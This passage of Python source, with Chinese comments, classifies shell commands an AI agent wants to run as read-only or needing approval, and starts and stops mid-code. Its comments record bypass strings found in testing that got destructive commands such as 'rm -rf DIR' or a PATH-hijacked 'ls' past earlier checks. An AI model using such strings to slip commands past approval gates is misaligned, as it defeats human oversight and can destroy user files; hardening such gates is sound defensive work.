    r"^(PATH|IFS|SHELL|BASH_ENV|ENV|CDPATH|FPATH|"
    r"LD_[A-Z_]*|DYLD_[A-Z_]*|PYTHON[A-Z_]*|NODE_[A-Z_]*|"
    r"GIT_(?:SSH|EXTERNAL_DIFF|PAGER|EDITOR|CONFIG[A-Z_]*|DIR|EXEC_PATH)[A-Z_]*|"
    r"PERL5[A-Z_]*|RUBYOPT|GEM_[A-Z_]*)$"
)

# 输出重定向。`2>&1` 和 `2>/dev/null` 不写用户的文件，但为了判据简单，
# 只放过纯 fd 重定向（`N>&M`），其余一律要问。
# 任何形式的输出重定向都要问。
# 🔴 原来写成 `(?<![0-9&])>{1,2}(?!&[0-9-])`，为了放过 `2>/dev/null` 而放过了
# **所有带 fd 号的写重定向** —— 实测 `echo PWNED 1>/tmp/pwned` 真写了文件、
# `cat x 2>/tmp/victim` 真把 victim 截断成 0 字节（重定向的打开动作本身就 O_TRUNC）。
_REDIRECT = re.compile(r">")

# 只有这两种重定向不写用户的文件，可以先摘掉：
#   - 丢到 /dev/null（agent 高频写法：探测某个东西存不存在）
#   - fd 之间合并（`2>&1`）
# 🔴 原来用 `\d+>\s*\S+` 摘"任意目标"，`\S+` 会贪婪吃掉后面的分隔符 ——
# 实测 `ls 2>/dev/null; rm -rf DIR` 里的分号被一起吃掉，第二条命令整段
# 从"命令位置"消失，DIR 真的被删了。
_HARMLESS_REDIRECT = re.compile(r"\d*>&\d+|\d*>\s*/dev/null\b")
_SUBSTITUTION = re.compile(r"\$\(|`|<\(")

# 抓 `$(...)` 里的内容（非贪婪、不跨嵌套）。反引号形式一并抓。
# `<(...)` 进程替换不放行 —— 它的语义更复杂，留给审批。
_INNER_SUBSTITUTION = re.compile(r"\$\(([^()]*)\)|`([^`]*)`")


class Verdict:
    """判定结果。`readonly` 为 True 才允许跳过审批。"""

    __slots__ = ("readonly", "reason")

    def __init__(self, readonly: bool, reason: str) -> None:
        self.readonly = readonly
        self.reason = reason

    def __repr__(self) -> str:  # pragma: no cover - 调试用
        return f"Verdict(readonly={self.readonly}, reason={self.reason!r})"


def _command_heads(tokens: list[str]) -> list[tuple[str, int]] | None:
    """逐段取出「首个命令词」及其位置。返回 None 表示「判不出，走审批」。

    跳过 `for VAR in LIST` 的变量和列表 —— 原来的版本把循环变量 `d` 当成了
    命令名，导致 `for d in */; do echo $d; done` 被判成「不认识的命令：d」。
    """
    heads: list[tuple[str, int]] = []
    expect_command = True
    # 当前这一段的命令名。给 `find` 用：它的 `\( … \)` 是**表达式分组**，
    # 不是 shell 子 shell。
    current = ""
    i = 0
    while i < len(tokens):
        token = tokens[i]
        if current in _EXPRESSION_COMMANDS and token in ("(", ")", "!"):
            # 🔴 `(` 在 `_SEPARATORS` 里（为了抓住 `ls && (rm -rf x)` 这种子 shell），
            # 但 `find . \( -name a -o -name b \)` 里的括号是 find 自己的分组运算符。
            # 不区分的话括号后面那个 `-name` 会被当成「新的命令位置」⇒ 判成
            # 「不在只读命令白名单里：-name」。实测（2026-11-03，24 个真实问法）
            # 这一条占 4 张卡片，全是 agent 找 package.json / *.log 的标准写法。
            #
            # 安全性：只在**这一段的命令确实是 find** 时才这样看，而且真正的分隔符
            # （`;` `|` `&&`）照旧生效 —— `find . \( -name a \); rm -rf x` 里的
            # `rm` 仍在命令位置上，照样被抓。find 自己能写/能执行的
            # `-delete`/`-exec` 由 `_FIND_UNSAFE` 另外拦。
            i += 1
            continue
        if token in ("for", "select"):
            # `for VAR in LIST` —— 变量和列表都不是命令，吃到 `do` / `;` 为止
            j = i + 1
            while j < len(tokens) and tokens[j] not in ("do", ";"):
                j += 1
            i = j
            expect_command = True
            continue
        if token in ("while", "until"):
            # 🔴 `while`/`until` 的**条件就是会执行的命令**，不能像 for 一样跳过。
            # 实测 `until rm -rf DIR; do sleep 1; done` 真删了目录；
            # 条件位放 `python3 -c` 就是任意代码执行。
            i += 1
            expect_command = True
            continue
        if token == "case":
            # `case EXPR in` —— EXPR 不是命令，吃到 `in`
            j = i + 1
            while j < len(tokens) and tokens[j] != "in":
                j += 1
            i = j + 1
            expect_command = True
            continue
        if token == "if":
            i += 1
            expect_command = True
            continue
        if token in _SEPARATORS or _PUNCTUATION_ONLY.match(token):
            # 合并标点（`);`、`)&&`、`)|`）也是分隔符 —— 见 `_PUNCTUATION_ONLY`
            # 的红字：不认它的话 `(ls); rm -rf DIR` 里的分号整段消失，
            # 实测目录真被删了而判据说"全部是只读"。
            expect_command = True
            current = ""   # 新的一段，上一段的"我是 find"不再成立
            i += 1
            continue
        if token in _STRUCTURE:
            i += 1
            continue
        if expect_command and token.endswith(")") and len(token) > 1:
            # case 的分支标签（`a)` / `*)`）不是命令
            i += 1
            continue
        if expect_command:
            # `VAR=value cmd` 的前缀赋值不是命令，但**不能无条件跳过** ——
            # `PATH=/tmp/evil ls` 实测会跑攻击者的 `ls`（白名单的名字成了空壳），
            # `DYLD_INSERT_LIBRARIES=...` 同理。只放过明确无害的变量名。
            head = token.split("/")[0]
            if "=" in head[:32] and not token.startswith("-"):
                name = token.split("=", 1)[0]
                # 只拦**能改变"跑哪个程序"或"怎么分词"**的变量 ——
                # 那些让白名单的名字变成空壳（实测 `PATH=/tmp/evil ls` 真跑了
                # 攻击者的程序）。普通变量（`D=/tmp ls $D`）是 agent 的常见写法，
                # 拦了纯属误伤。
                if _DANGEROUS_ENV.match(name) and not _HARMLESS_ASSIGNMENT.match(token):
                    # 🔴 返回 None（不是 `[]`）：调用方要能把"有危险变量"和
                    # "这条命令里没有命令可跑"分开。混在一起的话，要么
                    # `PATH=/evil ls` 被放行，要么纯赋值 `n=$(ls)` 被判成要问。
                    return None
                i += 1
                continue
            heads.append((token, i))
            current = token.rsplit("/", 1)[-1]
            expect_command = False
        i += 1
    return heads


def _segment(tokens: list[str], start: int) -> list[str]:
    """取「这一段」的 token：从命令词开始，到下一个分隔符/结构词为止。

    🔴 所有按选项判的门（`_WRITE_FLAG_GATED`、`_SED_UNSAFE`、`_GIT_UNSAFE_FLAGS` …）
    原来都拿**整条命令文本**去 search，于是别的段的选项会污染前一段的判定。
    实测（2026-11-03）全是纯只读却被判要问的：

      | 命令 | 被判成 | 污染源 |
      |---|---|---|
      | `git log --oneline \\| grep -e feat` | git log 带了会改东西的选项 | `grep -e` |
      | `git status --short; ls -d */` | 同上 | `ls -d` |
      | `git status \\| tr -d ' '` | 同上 | `tr -d` |
      | `grep -i todo -r . \\| sed 's/:.*//'` | sed 带了 -i | `grep -i` |
      | `ls -i \\| sed -n 1p` | 同上 | `ls -i` |
      | `ls -o \\| sort -n` | sort 带了会写文件的选项 | `ls -o` |
      | `cat a \\| shasum \\| head -c 8` | shasum 带了会写文件的选项 | `head -c` |
      | `date; ls foo` | date 带了参数，可能是在设置 | `ls` 的 `foo` |

    `grep -i` / `ls -d` / `tr -d` / `head -c` 都是 agent 的最高频写法，所以这一条
    正好砸在最常见的管道上。按段判之后每个门只看自己那一段。

    🔴 `find` 的 `\\( … \\)` 要留在同一段里。`(` 在 `_SEPARATORS` 里，不特判的话
    `find . \\( -name a \\) -delete` 的段只到 `find .` 为止 ⇒ `-delete` 落在段外、
    `_FIND_UNSAFE` 看不到它 ⇒ **放行一个删文件的命令**（我自己改括号时踩的，
    靠这条测试抓回来）。
    """
    base = (tokens[start] if start < len(tokens) else "").rsplit("/", 1)[-1]
    expression = base in _EXPRESSION_COMMANDS
    out: list[str] = []
    i = start
    while i < len(tokens):
        token = tokens[i]
        if expression and token in ("(", ")", "!"):
            out.append(token)
            i += 1
            continue
        if (
            token in _SEPARATORS
            or token in _STRUCTURE
            or _PUNCTUATION_ONLY.match(token)
        ):
            break
        out.append(token)
        i += 1
    return out


def _segment_text(tokens: list[str], start: int) -> str:
    """把一段 token 拼回文本，给那些写成正则的选项门用。

    拼回来的文本和原文不是逐字节相同（引号被 shlex 摘掉了），但各个门要找的
    都是 `-i` / `-o` / `set-url` 这类**选项形状**，对空白不敏感。
    用 `shlex.join` 会把 `-i` 原样留着、把带空格的参数重新加引号，
    所以 `sed 's/a/b/'` 这种不会被误读成带选项。
    """
    return " ".join(tokens[start:start + len(_segment(tokens, start))])


def _first_argument(tokens: list[str], start: int) -> str | None:
    """取某个命令后的第一个非选项参数（用于看子命令）。

    `git -C /path status` 要跳过 `-C` 和它的值 —— 带值选项按命令区分
    （见 `_OPTS_WITH_VALUE_BY_CMD` 的红字）。
    """
    base = (tokens[start] if start < len(tokens) else "").rsplit("/", 1)[-1]
    value_opts = _OPTS_WITH_VALUE_BY_CMD.get(base, _OPTS_WITH_VALUE_DEFAULT)
    i = start + 1
    while i < len(tokens):
        token = tokens[i]
        if (
            token in _SEPARATORS
            or token in _STRUCTURE
            or _PUNCTUATION_ONLY.match(token)
        ):
            return None
        if token in value_opts:
            i += 2
            continue
        if token.startswith("-"):
            i += 1
            continue
        return token
    return None


def _positionals(tokens: list[str], start: int) -> list[str]:
    """取这一段里的位置参数（跳过选项**和带值选项的值**）。

    🔴 不扣掉 `-C` 的值就会把目录名当成要创建的名字：实测
    `git -C webapp branch --show-current` 被判成「git branch 带了名字，是在创建」
    而弹卡，同一条去掉 `-C webapp` 就放行。

    🔴 但带值选项要**按命令区分**：`-c` 对 git 带值、对 `uniq` 不带值。
    用一张全局表会把 `uniq -c a b` 的 `a` 吃掉 ⇒ 只剩一个位置参数 ⇒
    漏判成只读，而 `b` 是输出文件（实测能真写）。

    🔴 而且 git 的 `-C`/`-c` **只在子命令之前**是带值的全局选项。
    子命令之后它们是子命令自己的开关：`git branch -C <新名>` / `-c <新名>`
    是「复制分支」，实测 `git branch -C copiedbranch` 真建出了分支。
    无条件跳值就会把那个新名字当成 `-C` 的值吃掉 ⇒ 位置参数只剩子命令本身
    ⇒ 放行一个写操作（我自己改 `-C` 时引入的洞，靠
    `test_git_dash_c_after_subcommand_is_branch_copy_not_a_value_option` 抓回来）。
    所以**收到第一个位置参数之后就不再跳值**。
    """
    base = (tokens[start] if start < len(tokens) else "").rsplit("/", 1)[-1]
    value_opts = _OPTS_WITH_VALUE_BY_CMD.get(base, _OPTS_WITH_VALUE_DEFAULT)
    # 只在子命令之前跳值的命令。`find`/`grep` 这些的带值选项（`-name`、`-e`）
    # 在整条命令里都带值，不受这个限制。
    subcommand_scoped = base == "git"
    out: list[str] = []
    i = start + 1
    while i < len(tokens):
        token = tokens[i]
        if (
            token in _SEPARATORS
            or token in _STRUCTURE
            or _PUNCTUATION_ONLY.match(token)
        ):
            break
        if token in value_opts and not (subcommand_scoped and out):
            i += 2
            continue
        if token.startswith("-"):
            i += 1
            continue
        out.append(token)
        i += 1
    return out


# 这些命令在 READERS 里，但自带写文件的开关/位置参数 ⇒ 要按选项判。
# 实测：`sort -o FILE src` 写文件、`uniq src OUT` 第二个位置参数就是输出
#（没有任何开关提示，最阴）、`file -C -m X` 写出 X.mgc。
_WRITE_FLAG_GATED = {
    "sort": re.compile(r"(^|\s)(-o|--output)[=\s]"),
    "file": re.compile(r"(^|\s)-C\b"),
    "shasum": re.compile(r"(^|\s)(-c|--check)\b"),
    # `yq -i` 就地改 YAML —— 和刻意被排除的 `sed -i` 一模一样，
    # 而且能改的正是 k8s/CI 的配置（实测真改了文件）。
    "yq": re.compile(r"(^|\s)(-i|--inplace)\b"),
    "jq": re.compile(r"(^|\s)(-i|--in-place)\b"),
    # `sysctl -w` 改内核参数。实测当前非 root 被挡住，但**不能靠"恰好不是 root"兜底** ——
    # 判据本身要对，否则哪天跑在有权限的环境里就穿了。
    "sysctl": re.compile(r"(^|\s)-w\b"),
    # `lsof -D b|u <path>` 建/更新 device cache 文件（默认落在家目录 `.lsof_<host>`）。
    # 本机 lsof 4.91 实测回 "unsupported option: -D"，但判据不靠"恰好不支持"兜底 ——
    # 别的机器上编译进去就穿了。
    # ⚠️ 只拦 `-D`，**不拦 `+D`**：man 写明 `+D <目录>` 是"递归搜这个目录下的
    # 打开文件"，纯读。大小写也不能混 —— `-D` 和 `+D` 在 lsof 里是两回事。
    # 查端口用的 `-i/-n/-P/-s/-t` 不受影响。
    # 🔴 短选项可以**捆绑**：`lsof -nPD b/tmp/x` 里的 `D` 不在 token 开头，
    # 只认 `(^|\s)-D` 配不上（对抗探针抓到的）。
    # 但也不能写成 `-[A-Za-z]*D` —— lsof 有一串**带附着值**的短选项
    # （`-c -d -i -F -g -o -p -s -S -T -u -x -L`），`-iUDP` = `-i` 带值 `UDP`，
    # 那个 `D` 属于协议名不是选项。实测踩过：`lsof -iUDP -n -P` 被判成带 -D。
    # 所以捆绑串里只允许**不带值**的短选项字母，遇到带值的就停。
    "lsof": re.compile(r"(^|\s)-[abhlnNoOPRtUvVX?]*D"),
}

# 这些命令**不带参数时是查询、带参数时是设置**。实测 `date <时间>`、
# `hostname <名>` 会改系统状态（当前非 root 被内核挡，但判据不该依赖这个）。
_QUERY_ONLY_WHEN_BARE = frozenset({"date", "hostname", "sw_vers", "id", "whoami", "uname"})
# 🔴 第 16 轮：解释器只允许问版本。`node --version` / `python3 -V` 是看一眼；
# 而 `python3 -c …` / `node -e …` 是「用解释器跑任意代码」（`_NEVER_APPROVABLE` 里挡着），
# 裸 `python3 x.py` 也可能写任何东西 ⇒ 除了纯查询选项，一律要问。
_VERSION_ONLY = frozenset({"node", "python", "python3", "ruby", "perl", "php", "deno", "bun", "go", "cargo", "rustc", "java", "javac", "swift", "clang", "gcc", "pnpm", "yarn", "claude"})

# 这些工具的版本是**子命令**而不是选项：`go version` / `cargo version`。
# 实测 `go version` 回 33B 立刻退出。只放这一个词 ——
# 🔴 `go env` 不放：`go env -w GOPROXY=…` 会写 `~/Library/Application Support/go/env`
#（换模块代理 = 供应链），而 `go env GOPATH` 这种纯读没法和它按一个词区分 ⇒ 不放。
# 🔴 `go build/run/get/install` 全不放：会下依赖、会写产物、会跑代码。
_VERSION_SUBCOMMANDS = frozenset({"version"})

# 纯查询选项：带这些（且只带这些）时，不用看子命令。
_PURE_QUERY_FLAGS = frozenset(
    {"--version", "-v", "-V", "--help", "-h", "--usage"}
)

# `uniq` 的第二个位置参数是输出文件 ⇒ 超过一个位置参数就要问
_POSITIONAL_WRITERS = frozenset({"uniq", "tee"})

# `sed` 默认只是把结果打到 stdout —— **只有 `-i` 才就地改文件**。
# 2026-11-03 真实现场：用户问"有哪些 claude 在跑"，agent 写了
# `ps … | grep … | sed 's/a/b/'`（纯文本替换），因为 sed 被一刀切拉黑而弹了卡片。
# agent 高频用 sed/awk 做管道里的文本整理，整个禁掉等于天天弹卡片。
_SED_UNSAFE = re.compile(r"(^|\s)(-i|--in-place)\b|(^|\s)-\w*i\w*\b(?=\s|$)")

# `awk` 能用 `print > "file"` / `printf > f` / `system()` 写东西。
# 它的程序体在引号里，所以看**整条命令文本**里有没有这些形状。
_AWK_UNSAFE = re.compile(r"(print\w*\s*>|system\s*\(|\|\s*[\"']?(sh|bash)\b|>>?\s*[\"'])")

# `find` 默认只是遍历，但这些选项会写/执行。按选项判，不整个拉黑 ——
# agent 高频用 `find . -name x -type d` 做纯查询（实测它就这么写）。
_FIND_UNSAFE = re.compile(
    r"-(delete|exec|execdir|ok|okdir|fls|fprint|fprintf|fprint0)\b"
)

# `-exec` / `-execdir` 之外的那些（`-delete`、`-fprint…`）没有"安全变体"，
# 一律要问。`-exec` 有：`find . -type f -exec wc -c {} +` 是纯查询，
# 而它是 2026-11-03 采集里**最大的单一噪音源**（33 张卡里 7 张）。
_FIND_WRITE_ONLY = re.compile(r"-(delete|fls|fprint|fprintf|fprint0)\b")
_FIND_EXEC = re.compile(r"-(exec|execdir|ok|okdir)\b")

# `-exec CMD … {} ;|+` 里被执行的那条命令，交回 `classify` 递归判。
#
# 🔴 **`+` 形式会把多个文件一次喂给那条命令** —— 所以不能只看"这条命令是不是
# 只读"，还得看"多给几个位置参数会不会变成写"。实测打穿过：
#   `find . -type f -exec uniq {} +` 把 `./zzz.txt` 当成 `./aaa.txt` 的**输出文件**，
#   一个 20 字节的文件真被覆盖成 4 字节（`uniq [input [output]]` 是 BSD 的语义）。
# 单独判 `uniq {}` 只有一个位置参数 ⇒ 判成只读 ⇒ 漏放。
# 所以 `_POSITIONAL_WRITERS` 里的命令**无论几个参数**都不许进 `-exec`。
#
# 🔴 还要挡住**转发器**：`command` / `builtin` / `env` / `nice` 这类"跑另一个程序"
# 的壳。它们在 `READERS` 里（`command -v redis-cli` 是探测命令存不存在的高频写法），
# 于是 `find . -exec command rm {} +` 的 payload 被判成只读 ⇒ 实测**文件真被删了**
# （`/usr/bin/command` 确实存在，不只是 shell 内建）。
# 递归判 payload 时不能靠"第一个词是只读的"—— 转发器的危险在它的参数里。
_EXEC_FORBIDDEN_HEADS = _POSITIONAL_WRITERS | frozenset(
    {"xargs", "command", "builtin", "env", "nice", "nohup", "time", "timeout",
     "stdbuf", "setsid", "script", "watch"}
)

# `xargs` 和 `find -exec` 是同一个形状：它本身不写，**它跑的那条命令**才决定。
# 实测 `echo v.txt | xargs rm` 真删了文件 ⇒ 不能进白名单；
# 但 `find … | xargs wc -l` 是纯查询，而它是修完 24 个问法后**唯一剩下的那张卡**。
#
# 🔴 和 `-exec +` 一样会**一次喂多个参数** ⇒ `_POSITIONAL_WRITERS` 里那些
#（`uniq a b` 的 b 是输出文件）照旧不许跑。
# `-I{}` / `-i` 的替换形式也不放行：参数位置由模板决定，静态判不出谁是输出。
_XARGS_OPTS_WITH_VALUE = frozenset({"-n", "-P", "-L", "-s", "-I", "-E", "-J"})
_XARGS_UNSAFE_OPTS = re.compile(r"(^|\s)(-I|-i\b|--replace)")


def _find_exec_payloads(tokens: list[str], start: int) -> list[list[str]] | None:
    """抽出 `find … -exec CMD args {} ;` 里的每一段 CMD。

    返回 None 表示"结构看不懂" ⇒ 调用方当判不出处理（走审批）。
    """
    seg = _segment(tokens, start)
    payloads: list[list[str]] = []
    i = 0
    while i < len(seg):
        if seg[i] not in ("-exec", "-execdir", "-ok", "-okdir"):
            i += 1
            continue
        i += 1
        body: list[str] = []
        # `-exec` 的命令一直到 `;` 或 `+` 为止。`{}` 是占位符，不是参数。
        while i < len(seg) and seg[i] not in (";", "+"):
            if seg[i] != "{}":
                body.append(seg[i])
            i += 1
        if i >= len(seg):
            return None          # 没有收尾的 `;` / `+` ⇒ 结构看不懂
        i += 1
        if not body:
            return None
        payloads.append(body)
    return payloads


_ANSI_C_QUOTE = re.compile(r"\$'")


def _strip_comment(line: str) -> str:
    """剥掉**命令位置**的行尾注释，引号里的 `#` 不碰。

    不能用 `re.sub(r"(^|\\s)#.*$", …)`：它不认引号，`grep '# TODO' f` 的模式
    会被当成注释剥掉（那条命令整段消失 ⇒ 后面的段落错位）。也不能交给 shlex 的
    `commenters`：它在**词中间**也当注释，而 shell 不是（`echo a#b` 打出 `a#b`）。

    判据：从左往右扫，记住当前在不在单/双引号里；只有**引号外、且前面是行首或
    没被转义的空白**的 `#` 才是注释起点。反斜杠转义的下一个字符一律跳过。

    🔴 「前面是空白」要看那个空白**有没有被转义**，不能只看 `line[i-1].isspace()`。
    实测 `echo a\\ #b ; rm -rf DIR`：bash 眼里 `\\ ` 是转义空格 ⇒ `a #b` 是**一个词**、
    `#` 不是注释 ⇒ 分号是真分隔符、DIR 真被删。只看前一个字符是不是空白的话，
    会把它当注释、把后半条命令吃掉 ⇒ 判成只读（差分测试 `bash` 当裁判抓到的）。
    """
    in_single = in_double = False
    # 下一个字符是不是处在「词的开头」（行首，或前面是**未转义**的空白）。
    at_word_start = True
    i = 0
    while i < len(line):
        ch = line[i]
        if ch == "\\" and not in_single:
            # 转义：`\#` 不是注释、`\'` 不开引号、`\ ` 是词里的空格（不是词边界）
            i += 2
            at_word_start = False
            continue
        if ch == "'" and not in_double:
            in_single = not in_single
            at_word_start = False
        elif ch == '"' and not in_single:
            in_double = not in_double
            at_word_start = False
        elif ch == "#" and not in_single and not in_double and at_word_start:
            return line[:i]
        elif ch.isspace() and not in_single and not in_double:
            at_word_start = True
        else:
            at_word_start = False
        i += 1
    return line


def classify(command: str) -> Verdict:
    """判这条命令是不是纯只读。判不出就返回 readonly=False（保守）。"""
    text = (command or "").strip()
    if not text:
        return Verdict(False, "空命令")
    # 命令替换：**递归判里面那条**。
    # agent 高频写 `for d in $(find . -name .git); do …` 这种纯查询，
    # 整个禁掉是最大的噪音源之一。但不能无条件放行 ——
    # 实测 `$(echo rm) -f x` 能绕过 `Bash(rm:*)` 的 deny。
    # 所以：里面也必须是只读命令，且**不允许嵌套替换**（防指数级绕法）。
    inner_commands = [
        grp for pair in _INNER_SUBSTITUTION.findall(text) for grp in pair if grp
    ]
    if inner_commands:
        # 🔴 反引号的嵌套检测要单独做：`_SUBSTITUTION` 只认 `$(` 和**单个**反引号，
        # 而 ``echo `rm` `` 这种嵌套里层已经被外层正则吃掉了。
        # 实测漏判过：``echo `echo `rm``` `` 被判成只读。
        # 判据：反引号总数不是 2 的整数倍，或原文里反引号超过 2 个 ⇒ 有嵌套。
        if text.count("`") > 2 or _SUBSTITUTION.search("".join(inner_commands)):
            return Verdict(False, "命令替换里还套着替换，判不出")
        for inner in inner_commands:
            inner_verdict = classify(inner)
            if not inner_verdict.readonly:
                return Verdict(
                    False, f"命令替换里的 `{inner.strip()[:40]}` 不是只读"
                )
        # 里面都只读 ⇒ 把替换整体摘掉，继续判外层。
        #
        # 🔴 **替换成 `X` 不能带空格**。原来写的是 `" X "`，于是
        # `n=$(git status | wc -l)` 变成 `n= X` ⇒ shlex 切出 `n=` 和 `X` 两个 token
        # ⇒ `X` 落在**命令位置**上 ⇒ 判成「不在只读命令白名单里：X」。
        # 实测（2026-11-03，24 个真实问法）33 张卡里 5 张就是这一条：agent 遍历
        # 多仓库时标准写法是 `n=$(git -C "$d" status --porcelain | wc -l)`。
        # 不带空格就还是 `n=X` 一个 token，走前缀赋值那条路、被正确跳过。
        #
        # 安全性没变：替换里那条命令**已经逐条递归判过只读**（上面那个循环），
        # 这里只是把"它的输出"占位成一个普通词。占位词落在参数位时无影响；
        # 落在命令位时（`$(echo rm) -f x`）—— 那种情况里替换本身就不是赋值的右边，
        # 而 `echo rm` 的 inner 判定照旧，`$(…)` 整体也仍要先过那一关。
        text = _INNER_SUBSTITUTION.sub("X", text)
    if _SUBSTITUTION.search(text):
        return Verdict(False, "有命令替换，静态判不出会执行什么")

    # 🔴 ANSI-C 引号 `$'…'`：里面的 `\'` 是**一个单引号字符**，不结束引号。
    # shlex 没有这个语法（它按 POSIX 单引号处理 ⇒ 认为 `\` 后面那个 `'` 把引号关了），
    # 所以引号边界会算错。实测（2026-11-07）`echo $'a\' #' ; rm -rf DIR`
    # 被判成「全部是只读命令」，拿 bash 真跑 **DIR 被删了** ——
    # bash 眼里 `#` 还在引号内不是注释、分号是真分隔符，而我们算成了注释。
    # 自己重新实现 `$'…'` 的转义规则不值得（`\n`/`\x41`/`\u` 都要管），
    # 判不出就走审批。
    if _ANSI_C_QUOTE.search(text):
        return Verdict(False, "有 $'…' 引号，静态判不出引号到哪结束")

    # 🔴 shlex 不把 `;` `|` `&&` 当独立 token：`git -C "$d" status; done` 会切出
    # `status;` 这种带分号的词，导致子命令判定对不上（实测踩过）。
    # 所以先在元字符两侧补空格，再交给 shlex。补空格不改变命令语义，
    # 因为这里只做分类、不执行。
    # 先把 fd 重定向（`2>&1`、`2>/dev/null`）整体摘掉：它们不写用户的文件，
    # 而且里面的 `&` 会被下面的分词规则拆成 `2` / `&` / `1`，
    # 让 `1` 被当成命令名（实测踩过：`ls 2>&1 | head` 被判成「不认识的命令：1」）。
    cleaned = _HARMLESS_REDIRECT.sub(" ", text)

    # 🔴 注释要**按行**剥掉，不能交给 shlex 的 comments=True。
    # 原来先把换行换成分号、再让 shlex 处理注释 ⇒ 行尾不存在了，`#` 一直吃到
    # 字符串结束。实测 `ls # 看看\nrm -rf DIR` 第二行整条消失、DIR 真被删 ——
    # 它正好打掉了"换行也是分隔符"这个修补。
    #
    # 换行本身也是命令分隔符：shlex 把它当普通空白**吃掉**，所以要先换成分号，
    # 否则 `git status\nrm -rf x` 的第二行不在"命令位置"上，会被判成只读。
    lines = []
    for line in re.split(r"[\n\r]+", cleaned):
        # 只剥**命令位置**的注释（行首或空白之后的 `#`），引号里和转义过的不碰。
        stripped = _strip_comment(line)
        if stripped.strip():
            lines.append(stripped)
    # 用 shlex 的 punctuation_chars：它能自己把 `; | & > >&` 切成独立 token，
    # 并且**认引号** —— `echo 'a > b'` 整个是一个 token，不含裸 `>`。
    # 自己先给分隔符加空格再分词是错的：那会把引号里的 `;` 和 `>` 也拆出来。
    try:
        lexer = shlex.shlex(" ; ".join(lines), posix=True, punctuation_chars=True)
        lexer.whitespace_split = True
        # 🔴 关掉 shlex 自己的注释处理。它的 `commenters='#'` 在**词中间**也生效，
        # 而 shell 不是这样：`a#b` 在 bash/zsh 里是普通词（实测 `echo a#b` 打出 `a#b`）。
        # 后果是整条命令的后半截被静默吃掉 —— 实测（2026-11-07）
        # `echo a#b ; rm -rf DIR` 只切出 `['echo','a']`，判成「全部是只读命令」，
        # 而拿 bash 真跑 **DIR 被删了**。同形状还有 `echo "a #b" ; rm -rf DIR`
        # 和 `$'a\' #'`（ANSI-C 引号）。
        # 真正的行尾注释已经在上面按行剥掉了（那一步认"行首或空白之后的 #"，
        # 和 shell 一致），所以这里不需要 shlex 再插手。
        lexer.commenters = ""
        tokens = list(lexer)
    except ValueError as exc:
        return Verdict(False, f"解析不了这条命令（{exc}）")

    # 重定向：裸的 `>` / `>>` / `>|`，或 fd 形式（`2>` 被切成 `2` + `>`）。
    # `2>&1` 被切成 `>&`，那是 fd 合并、不写文件，所以不算。
    #
    # 已知取舍：`grep '>' f` 里引号包裹的单字符 `>` 分词后和真重定向长得一样，
    # 会被多问一次。宁可多问，不可漏放 —— 漏放的代价是文件被静默覆盖
    # （实测 `echo X 1>/tmp/f`、`cat x 2>/tmp/victim` 都真写/真截断了）。
    if any(token in (">", ">>", ">|") for token in tokens):
        return Verdict(False, "有输出重定向，会写文件")

    if not tokens:
        return Verdict(False, "解析后没有命令")

    heads = _command_heads(tokens)
    if heads is None:
        return Verdict(False, "认不出命令")
    if not heads:
        # 一条命令都没有 —— 只剩前缀赋值（`n=$(git status | wc -l)` 把替换摘掉后
        # 就是这样）。赋值本身不碰文件，右边那条替换已经逐条判过只读了。
        # 实测（2026-11-03）33 张卡里 5 张是这个形状。
        return Verdict(True, "只有变量赋值，没有命令要跑")

    for head, position in heads:
        # 🔴 不接受带路径的命令。`rsplit("/")[-1]` 只看最后一段 ⇒ `./ls`、
        # `/tmp/evil/ls` 都会被当成白名单里的 `ls`（实测真跑了攻击者的程序）。
        if "/" in head:
            return Verdict(False, f"命令带路径，判不出是哪个程序：{head}")
        base = head
        # 🔴 所有按选项判的门只看**这一段**，不看整条命令 —— 见 `_segment` 的表。
        seg = _segment_text(tokens, position)
        if base == "xargs":
            # 和 `find -exec` 同一个形状：危险在它跑的那条命令里。
            # 实测 `echo v.txt | xargs rm` 真删了文件。
            if _XARGS_UNSAFE_OPTS.search(seg):
                return Verdict(False, "xargs 带了 -I/-i 替换，参数位置判不出")
            rest = _segment(tokens, position + 1)
            i = 0
            while i < len(rest):
                token = rest[i]
                if not token.startswith("-"):
                    break
                # `-n 1` 分开写时要连值一起跳；`-n1` 捆绑的只占一个 token
                i += 2 if token in _XARGS_OPTS_WITH_VALUE else 1
            payload = rest[i:]
            if not payload:
                # 不带命令的 `xargs` 默认跑 `echo`（实测 `echo hello | xargs`
                # 打出 hello）⇒ 只读。
                continue
            if payload[0].rsplit("/", 1)[-1] in _EXEC_FORBIDDEN_HEADS:
                return Verdict(
                    False, f"xargs 跑 {payload[0]}，多给几个参数就会写"
                )
            inner = classify(" ".join(shlex.quote(t) for t in payload))
            if not inner.readonly:
                return Verdict(
                    False, f"xargs 跑的 `{' '.join(payload)[:40]}` 不是只读"
                )
            continue
        if base in _FORWARDERS:
            # 转发器：危险在它转发的那条命令里。实测 `command rm -rf x` 真删了文件。
            print_only = _FORWARDERS[base]
            if print_only is not None and print_only.search(seg):
                continue          # `command -v redis-cli` 只打印路径
            # 🔴 要把**原样的** token 交回去递归判，不能用 `_positionals` ——
            # 它会把选项剥掉，于是 `command sort -o out f` 递归时变成
            # `sort out f`，`-o` 不见了 ⇒ `sort` 的写开关门看不到 ⇒ 漏放
            #（对抗探针抓到的）。只跳过转发器自己的选项（`command -p`），
            # 从**第一个非选项词**起原样保留。
            rest = _segment(tokens, position + 1)
            while rest and rest[0].startswith("-"):
                rest = rest[1:]
            forwarded = rest
            if not forwarded:
                return Verdict(False, f"{base} 没有要跑的命令，判不出")
            inner = classify(" ".join(shlex.quote(t) for t in forwarded))
            if not inner.readonly:
                return Verdict(
                    False, f"{base} 转发的 `{' '.join(forwarded)[:40]}` 不是只读"
                )
            continue
        if base == "sed":
            if _SED_UNSAFE.search(seg):
                return Verdict(False, "sed 带了 -i，会就地改文件")
            continue
        if base == "awk":
            if _AWK_UNSAFE.search(seg):
                return Verdict(False, "awk 的程序体里有写文件或执行命令")
            continue
        if base == "find":
            if _FIND_WRITE_ONLY.search(seg):
                return Verdict(False, "find 带了会写文件的选项")
            if _FIND_EXEC.search(seg):
                # `-exec` 不等于"要写" —— 被执行的那条命令才决定。
                # 实测（2026-11-03，24 个真实问法）33 张卡里 7 张是
                # `find … -exec wc -c {} +` / `-exec ls -lt {} +`，纯查询。
                # 所以递归判 payload，判不出就照旧要问。
                payloads = _find_exec_payloads(tokens, position)
                if payloads is None:
                    return Verdict(False, "find -exec 的结构判不出")
                for body in payloads:
                    if body[0].rsplit("/", 1)[-1] in _EXEC_FORBIDDEN_HEADS:
